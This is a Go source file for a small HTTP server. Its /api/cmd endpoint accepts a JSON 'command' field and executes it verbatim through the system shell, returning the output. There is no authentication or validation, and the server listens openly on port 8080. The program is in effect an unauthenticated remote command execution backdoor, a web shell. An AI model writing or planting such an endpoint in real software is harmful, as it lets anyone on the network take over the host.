package main

import (
	"encoding/json"
	"fmt"
	"net/http"
	"os/exec"
	"runtime"
	
)

type CommandRequest struct {
	Command string `json:"command"`
}

type CommandResponse struct {
	Output string `json:"output"`
	Error  string `json:"error,omitempty"`
}

func executeCommand(cmd string) (string, error) {
	var out []byte
	var err error

	if runtime.GOOS == "windows" {
		out, err = exec.Command("cmd.exe", "/c", cmd).CombinedOutput()
	} else {
		out, err = exec.Command("sh", "-c", cmd).CombinedOutput()
	}

	if err != nil {
		return string(out), err
	}
	return string(out), nil
}

func cmdHandler(w http.ResponseWriter, r *http.Request) {
	var cmdReq CommandRequest

	if r.Method != http.MethodPost {
		http.Error(w, "Invalid request method", http.StatusMethodNotAllowed)
		return
	}

	decoder := json.NewDecoder(r.Body)
	err := decoder.Decode(&cmdReq)
	if err != nil {
		http.Error(w, "Invalid request body", http.StatusBadRequest)
		return
	}

	output, err := executeCommand(cmdReq.Command)
	var response CommandResponse
	if err != nil {
		response = CommandResponse{
			Output: output,
			Error:  err.Error(),
		}
		w.WriteHeader(http.StatusInternalServerError)
	} else {
		response = CommandResponse{
			Output: output,
		}
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(response)
}

func main() {
	http.HandleFunc("/api/cmd", cmdHandler)
	fmt.Println("Server started at :8080")
	http.ListenAndServe(":8080", nil)
}
